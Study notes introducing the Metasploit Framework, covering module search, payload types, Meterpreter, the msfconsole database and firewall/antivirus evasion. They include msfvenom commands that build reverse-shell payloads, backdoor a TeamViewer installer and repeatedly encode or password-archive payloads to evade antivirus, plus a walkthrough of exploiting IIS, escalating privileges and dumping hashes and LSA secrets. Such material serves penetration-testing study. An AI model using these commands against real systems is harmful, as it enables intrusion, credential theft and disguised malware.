# Introduction to Metasploit
The Metasploit Framework includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. 
Metasploit is not a jack of all trades but a swiss army knife with just enough tools to get us through the most common unpatched vulnerabilities.

The Metasploit Pro version is different from the Metasploit Framework one with some additional features:

Task Chains, Social Engineering, Vulnerability Validations, GUI, Quick Start Wizards, Nexpose Integration.

## Archietecture
__Data, Documentation, Lib__ These are the base files for the Framework. The Data and Lib are the functioning parts of the msfconsole interface, while the Documentation folder contains all the technical details about the project.
__Modules__ The Modules detailed above are split into separate categories in this folder. 
```
ls /usr/share/metasploit-framework/modules
```
__Plugins__
Plugins offer the pentester more flexibility when using the msfconsole since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.
```
ls /usr/share/metasploit-framework/plugins/
```
__Scripts__ Meterpreter functionality and other useful scripts.
```
ls /usr/share/metasploit-framework/scripts/
```
__Tools__ Command-line utilities that can be called directly from the msfconsole menu.
```
ls /usr/share/metasploit-framework/tools/
```
# Introddction to MSFconsole
Type msfconsole in the terminal of our choice. Many security-oriented distributions such as Parrot Security and Kali Linux come with msfconsole preinstalled.
```
msfconsole -q
```
__Update MSFconsole__
```
sudo apt update && sudo apt install metasploit-framework
```
- **Enumeration** is the initial phase before exploitation to gather details about the target.
- Identify public-facing services (e.g., HTTP, FTP, SQL) on the target.
- Perform a scan on the target’s IP to detect services and their versions.
- **Versions** of services are critical in determining vulnerabilities.
- Unpatched or outdated services are often the entry points for exploitation.

- The **MSF engagement structure** has five main categories:
  - Enumeration
  - Preparation
  - Exploitation
  - Privilege Escalation
  - Post-Exploitation
- Each category includes subcategories like Service Validation and Vulnerability Research.
- Understanding this structure helps in selecting appropriate MSF features for specific tasks.
![image](https://github.com/user-attachments/assets/c3ee6a7c-4b2a-43f4-b604-aa43b30a5c11)

# Modules
Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild.

**Index No.**
The No. tag will be displayed to select the exploit we want afterward during our searches. 
**Type**
The Type tag is the first level of segregation between the Metasploit modules.
| Type       | Description                                                                                 |
|------------|---------------------------------------------------------------------------------------------|
| Auxiliary  | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Encoders   | Ensure that payloads are intact to their destination.                                        |
| Exploits   | Defined as modules that exploit a vulnerability that will allow for the payload delivery.   |
| NOPs       | (No Operation code) Keep the payload sizes consistent across exploit attempts.              |
| Payloads   | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| Plugins    | Additional scripts can be integrated within an assessment with msfconsole and coexist.    |
| Post       | Wide array of modules to gather information, pivot deeper, etc.                             |

**OS**
The OS tag specifies which operating system and architecture the module was created for.
**Service**
The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials.
**Name**
Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.

## Searching for Modules
all search functions
```
help search
```
Search Exploit 
```
search eternalromance
```
Search better using -> **year (cve:<year>)**, the **platform Windows (platform:<os>)**, the **type of module** we want to find **(type:<auxiliary/exploit/post>)**, the **reliability** rank **(rank:<rank>)**, and the **search name (<pattern>)**.

```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
## Module Selection
```
search ms17_010
```
```
use no.1
```
after that see options

```
options
```
use the command **info** after selecting the module if we want to know something more about the module. 
```
info
```
set the options that are required 
```
set RHOSTS 10.10.10.40
```
Set global **setg**, which specifies options selected by us as permanent until the program is restarted.
```
setg RHOSTS 10.10.10.40
```
**Exploit Execution**
```
 run
```
# Targets
Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.

1. **Targets**:  
   - Unique to specific OS versions, service packs, or language versions.  
   - The chosen exploit module is adapted to match the identified target for a successful attack.

2. **`show targets` Command**:  
   - Inside a selected exploit module: Lists all vulnerable targets for that specific module.  
   - Outside any module: Prompts that an exploit module needs to be selected first.

3. **Exploit Module Information**:  
   - **Automatic Targeting**: Metasploit automatically detects the version of the target and adapts the exploit.  
   - **Manual Targeting**: Use `set target <index>` to manually choose the target from the available list based on your knowledge of the target's OS version and service pack.

4. **Target Types**:  
   - Target details may vary based on service packs, OS versions, or language versions.  
   - Metasploit adjusts parameters like the **return address**, which can be affected by differences in language packs or hooks.  
   - Common return addresses used in exploits include `jmp esp` or `pop/pop/ret` sequences.

5. **Return Address**:  
   - A critical part of the exploit that directs program flow.  
   - Language packs, software versions, or system hooks can change the location of the return address.  
   - Use **msfpescan** to find a suitable return address when crafting or adapting an exploit.

# Payloads

A Payload in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (exploits job) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (payload's job).

**Singles** are self-contained payloads that include both the exploit and the full shellcode necessary for execution. They are designed to be more stable and provide immediate results upon execution, although their larger size may limit compatibility with certain exploits. Examples of Single payloads include tasks like adding a user to the target system or initiating a process.

**Stagers** work in conjunction with Stages to establish a connection between the attacker and the victim. They are small and reliable, waiting on the attacker’s machine to connect after the Stage completes its run on the target. Metasploit intelligently selects the best available stager, reverting to less preferred options if necessary. There are two types of stagers: NX and NO-NX. NX stagers are typically larger due to the use of VirtualAlloc for memory allocation and are the default choice for Windows 7 compatibility, addressing reliability issues with NX CPUs and DEP.

**Stages** are payload components downloaded by Stagers, offering advanced features such as Meterpreter and VNC Injection without size constraints. They utilize middle stagers to improve handling of larger payloads, addressing the limitations of single recv() calls that may fail. The Stager first receives the middle stager, which then facilitates the full payload download.

## Staged Payloads

- **Definition**: Staged payloads modularize the exploitation process, separating functions into distinct code blocks that chain together to gain remote access to a target machine.
- **Objectives**: Besides shell access, they aim to be compact and stealthy to evade Antivirus (AV) and Intrusion Prevention System (IPS) detection.

### Stage0

- **Purpose**: The initial shellcode sent to the target to establish a reverse connection back to the attacker’s machine.
- **Common Types**: Seen in names like `reverse_tcp`, `reverse_https`, etc.
- **Communication**: Designed to read a larger subsequent payload (Stage1 mostly to gain shell access) into memory after a stable channel is established. 

### Meterpreter Payload

- **Characteristics**: A multifaceted payload using DLL injection, ensuring a stable and hard-to-detect connection. It resides in memory, leaving no traces on the hard drive.
- **Functionality**: Offers commands for keystroke capture, password collection, and more. It supports dynamic loading of scripts and plugins.

### Searching for Payloads

- **Finding Payloads**: Use `show payloads` in `msfconsole` to see available options.
- **Grep for Filtering**: To speed up searches, use `grep` with keywords, e.g., `grep meterpreter show payloads`.

### Selecting Payloads

- **Process**: To set a payload, first select an exploit module and use `set payload <no.>` with the corresponding index number.

## MSF Payload and Exploit Configuration
Detecting Target OS:

Running show payloads in the exploit module detects that the target is Windows, showing relevant payloads.
Key Parameters for Configuration:

Exploit Module:
RHOSTS: IP of the target machine.
RPORT: Check it's set to port 445 (SMB).
Payload Module:
LHOST: Attacker's IP address.
LPORT: Check it's not in use.
Check LHOST IP:

Use ifconfig in msfconsole.

Using Meterpreter:
Replace **whoami** with **getuid** to check user (meterpreter uses linux commands)

Meterpreter Commands:
Core Commands: Background session, load extensions, exit session.
File System Commands: ls, cd, upload, download.
Networking Commands: ifconfig, netstat, portfwd.
System Commands: ps, shell, shutdown.

Use help command to find out all possible commands of meterpreter.

To access shell use **shell** command.

**Channel 1** has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage.
## Payload Types
![image](https://github.com/user-attachments/assets/593bb485-7e62-499b-99f4-205fee825ce5)

# Encoders
- **Encoders** help make payloads compatible with different architectures (e.g., x64, x86, sparc, ppc, mips) and assist in antivirus evasion.
- They remove bad characters from payloads and can encode payloads in different formats for AV evasion, though their effectiveness for AV evasion has diminished.

## Shikata Ga Nai (SGN)
- One of the most widely used encoders, known for its ability to evade detection, though it's no longer as undetectable as before.
- **SGN** means "It cannot be helped".

## Payload Encoding Evolution
- **Pre-2015**: Used **msfpayload** and **msfencode** to generate and encode payloads.
- **Post-2015**: Both tools were combined into **msfvenom** for payload generation and encoding.

## Example: SGN Encoding with msfvenom
Generates encoded payloads:
```
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

## AV Evasion and Iterations
Encoding payloads multiple times with SGN increases the size but doesn't fully evade modern antivirus detection.
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
```

Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. Register for free and get api key.
```
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

# Databases
**Databases** in msfconsole are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.

## Setting up the Database
**PostgreSQL Status**
```
sudo service postgresql status
```
Start PostgreSQL
```
sudo systemctl start postgresql
```
**MSF - Initiate a Database**
```
sudo msfdb init
```
Sometimes an error can occur if Metasploit is not up to date. 

check msfdb status
```
 sudo msfdb status
```

**MSF - Connect to the Initiated Database**
```
sudo msfdb run
```
If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands:
```
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

The msfconsole also offers integrated help for the database. 

```
help database
```
## Using the Database
With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. 
### Workspaces

We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.

View current workspace use workspace command.
```
msf6 > workspace
```
Add Workspace
```
workspace -a Target_1
```
Delete Workspace 
```
workspace -d Target_1
```
Change workspace
```
workspace Target_1
```
we can use the **workspace -h command **for the help menu related to Workspaces.

## Importing Scan Results
we want to import a Nmap scan of a host into our Database's Workspace to understand the target better. We can use the db_import command for this.(make sure file is in .xml it is preferred)


```
db_import Target.xml
```

## Using Nmap Inside MSFconsole
```
db_nmap -sV -sS 10.10.10.8
```
![image](https://github.com/user-attachments/assets/40a4ceb3-6899-4adb-9998-23cd83b71163)


### Data Backup
make sure to back up our data if anything happens with the PostgreSQL service.

**db_export help command**
```
db_export -h
```

```
db_export -f xml backup.xml
```

### Hosts
The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions.For example, suppose msfconsole is linked with scanner plugins that can perform service and OS detection.

**MSF - Stored Hosts**
```
hosts -h
```
### Services
The services command functions the same way as the previous one. It contains a table with descriptions and information on services discovered during scans or interactions. In the same way as the command above, the entries here are highly customizable.
```
services -h
```
### Credentials
The creds command allows you to visualize the credentials gathered during your interactions with the target host. (can add manually the creds)
```
creds -h
```
### Loot
The loot command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
```
loot -h
```
# Plugins
Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework.The use of plugins makes a pentester's life even easier, bringing the functionality of well-known software into the msfconsole or Metasploit Pro environments.

## Using Plugins
Navigating to /usr/share/metasploit-framework/plugins, which is the default directory for every new installation of msfconsole, should show us which plugins we have 
```
ls /usr/share/metasploit-framework/plugins
```
**MSF - Load Nessus**

```
load nessus
```
```
 nessus_help
```
### Installing new Plugins 
 popular plugins are installed with each update of the Parrot OS distro as they are pushed out towards the public by their makers, collected in the Parrot update repo. 

 To install new custom plugins not included in new updates of the distro, we can take the .rb file provided on the maker's page and place it in the folder at /usr/share/metasploit-framework/plugins with the proper permissions.
**Downloading MSF Plugins**
```
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
```
Here we can take the plugin pentest.rb as an example and copy it to /usr/share/metasploit-framework/plugins.
```
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
Use the **load** command and **help **to see the actions that can be performed 
popular plugins below:
![image](https://github.com/user-attachments/assets/c0a8535d-2369-41f9-90b9-c883393d72b7)

## Mixins
Mixins are classes that act as methods for use by other classes without having to be the parent class of those other classes.

Thus, it would be deemed inappropriate to call it inheritance but rather inclusion. They are mainly used when we:

1) Want to provide a lot of optional features for a class.
2) Want to use one particular feature for a multitude of classes.

Most of the Ruby programming language revolves around Mixins as Modules. 

#  Sessions
MSFconsole can manage multiple modules at the same time. This is one of the many reasons it provides the user with so much flexibility. This is done with the use of Sessions, which creates dedicated control interfaces for all of your deployed modules.

## Using Sessions
While running any available exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of communication with the target host. (**[CTRL] + [Z]**)

**Listing Active Sessions**
```
sessions
```
**Interacting with a Session**
```
sessions -i 1
```
This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.

This can be done by backgrounding our current session, which is formed due to the success of the first exploit, searching for the second module we wish to run, and, if made possible by the type of module selected, selecting the session number on which the module should be run. This can be done from the second module's show options menu

Usually, these modules can be found in the post category, referring to Post-Exploitation modules. 
## Jobs
If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using [CTRL] + [C]. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the jobs command to look at the currently active tasks running in the background and terminate the old ones to free up the port.
**Viewing the Jobs Command Help Menu**
```
 jobs -h
```
**Viewing the Exploit Command Help Menu**
```
exploit -h
```
**Running an Exploit as a Background Job**
```
exploit -j
```
**Listing Running Jobs**
 To kill a specific job, look at the index no. of the job and use the kill [index no.]
 ```
jobs -l
```
# Meterpreter
The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. 

** Meterpreter Commands**
![image](https://github.com/user-attachments/assets/9293020f-102c-43fb-8a34-2b58d440a65e)

### Running Meterpreter

1. **Select Payload**
   - Use `show payloads` to select the appropriate Meterpreter payload based on:
     - Type of connection (bind, reverse, etc.)
     - Target OS (Windows, Linux, etc.)

2. **Exploit Execution**
   - When the exploit runs, the target executes the **initial stager** (bind, reverse, findtag, passivex, etc.).

3. **DLL Injection**
   - The stager loads the **Reflective DLL**, which injects Meterpreter into the target system.

4. **Core Initialization**
   - Meterpreter establishes an **AES-encrypted** connection over the socket.
   - Sends a **GET** request to your system, which configures the client.

5. **Loading Extensions**
   - Meterpreter loads extensions like:
     - **stdapi** (for basic functions like file management)
     - **priv** (for administrative actions, if available)
   - All communication remains **AES-encrypted**.

6. **Meterpreter Shell**
   - After the payload runs, you receive a **Meterpreter shell**.
   - Use `help` to see available commands.

The developers of Meterpreter set clear design goals for the project
1) Stealthy - Meterpreter runs in memory, injecting into processes without leaving files or creating new processes.
2) Powerful - It uses encrypted channelized communication, allowing shell spawning and secure data exchange.
3) Extensible - Meterpreter can load new features over the network without needing to rebuild.

## Using Meterpreter 

**MSF - Scanning Target**
```
db_nmap -sV -p- -T5 -A 10.10.10.15
```
use host and service command to find what is running on the machine. Explore the services.
Nmap scan more closely, we notice that the server is running Microsoft IIS httpd 6.0(This is an example situation). So we further our research in that direction, searching for common vulnerabilities for this version of IIS. 

**MSF - Searching for Exploit**
```
search iis_webdav_upload_asp
```
Set the options accordingly
![image](https://github.com/user-attachments/assets/b1a2176d-7c05-43ca-b125-45935ed19b83)

After gaining a Meterpreter shell, we notice a .asp file named metasploit28857905 on the target system. Since Meterpreter resides in memory, the file isn't needed, but msfconsole's attempt to remove it failed due to access permissions. Leaving such traces can expose the attack to sysadmins, who can stop it by scanning for similar filenames or signatures using regex. To continue the attack and elevate privileges, we attempt to migrate our process to a more privileged user after encountering an access denied message.

![image](https://github.com/user-attachments/assets/dfe1a2c2-8039-41e3-96a1-2b97a40dbc55)

Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the C:\Inetpub\ location, we find an interesting folder named AdminScripts. However, unfortunately, we do not have permission to read what is inside it.

Use local exploit suggester module, attach it to session. **Bg** the successful exploit session and run the module on the session.
![image](https://github.com/user-attachments/assets/d1e1bbab-9b41-49d6-ad87-7cfddd5ed8d4)

Running the recon module presents us with a multitude of options. Going through each separate one, we land on the ms15_051_client_copy_image entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

**MSF - Privilege Escalation**

```
use exploit/windows/local/ms15_051_client_copy_images
```
set the options and run the exploit you will gain root.

**MSF - Dumping Hashes**
```
 hashdump
```
```
lsa_dump_sam
```

**MSF - Meterpreter LSA Secrets Dump**
```
lsa_dump_secrets
```
From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.

# Firewall and IDS/IPS Evasion

- **Endpoint Protection**: Protects individual devices or hosts, typically through antivirus, antimalware, firewalls, and anti-DDoS software (e.g., Avast, Malwarebytes).
- **Perimeter Protection**: Safeguards the network edge with physical/virtual devices, including the DMZ, which houses public-facing servers that interact with both public and internal networks.
- **Security Policies**: Work like Access Control Lists (ACLs) to allow or deny specific network actions based on various rules for traffic, applications, users, files, etc.
  
### Detection Methods:
- **Signature-based Detection**: Matches traffic against known attack patterns (signatures) to raise alarms.
- **Heuristic/Statistical Anomaly Detection**: Compares network behavior to a baseline, raising alarms if behavior deviates from the norm.
- **Stateful Protocol Analysis**: Detects protocol misuse by comparing it to profiles of normal, non-malicious activity.
- **Live Monitoring (SOC)**: Analysts monitor live traffic and alarms, either manually responding or allowing automated responses.

### Evasion Techniques:
- **Circumventing AV and IDS/IPS**: Encoding payloads can help avoid detection, but modern security systems often block common payload patterns. Encryption (AES) tunnels in **msfconsole** can also bypass network-based IDS/IPS.
- **Payload Fingerprinting**: AV software may fingerprint payloads and block them, but **msfvenom** allows the use of executable templates, which can embed shellcode into legitimate programs, making detection harder.
- **Executable Templates**: Use these to hide payloads within legitimate software, reducing the chance of detection by AV systems.

msfvenom offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them , and use any executable as a platform from which we can launch our attack. 
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

When a target runs a backdoored executable, the program usually appears to do nothing, which can make the target suspicious. To avoid this, we can use the -k flag, which allows the real program to keep running normally while the malicious payload runs quietly in the background. However, if the target launches the backdoored file from a command-line interface (CLI), they might see a new window pop up showing the backdoor in action. This window will stay open until we finish interacting with the payload, which can still be a giveaway to the target.

## Archives
Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. ( Can alarm AV)

**Generating Payload**

```
 msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```
If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following.

```
msf-virustotal -k <API key> -f test.js
```
Now, try archiving it two times, passwording both archives upon creation, and removing the .rar/.zip/.7z extension from their names.

**Archiving the Payload**

```
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
```
**Removing the .RAR Extension**

```
mv test.rar test
```
Archiving the Payload Again
```
 rar a test2.rar -p test
```
Removing the .RAR Extension
```
 mv test2.rar test2
```
check with virustotal


## Packers
- **Packer**: Combines an executable, payload, and decompression code into one compressed file. When run, it decompresses and executes like the original program.
- **Purpose**: Provides protection against file-scanning mechanisms by compressing and hiding the payload.
- **msfvenom**: Offers file compression, structure modification, and encryption for backdoored executables.
- **Popular Packer Tools**: UPX packer, The Enigma Protector, MPRESS, ExeStealth, Morphine, Themida, MEW.

## Exploit Coding
- **Goal**: Make exploit code less identifiable to avoid security detection on target systems.
- **Buffer Overflow (BoF)**: Standard exploit might be recognized due to hex buffer patterns.
- **Randomization**: Introduce variation to break IPS/IDS detection signatures.
- **Example**: Use an offset switch inside the code, like `'Offset' => 5093`.
- **Avoid NOP Sleds**: NOP sleds (empty instructions before shellcode) are checked by IDS/IPS. Avoid using obvious patterns.
- **Testing**: Always test custom exploit code in a sandbox environment first.
- **Book Reference**: Metasploit - The Penetration Tester's Guide from No Starch Press is a good resource for learning exploit creation.

## Recompiling Meterpreter from Source Code
- **Common Defenses**: Intrusion Prevention Systems (IPS) and Antivirus Engines are designed to block malicious files based on their signatures.
- **Solution**: Recompiling Meterpreter can help evade these defenses by altering the signature and behavior.


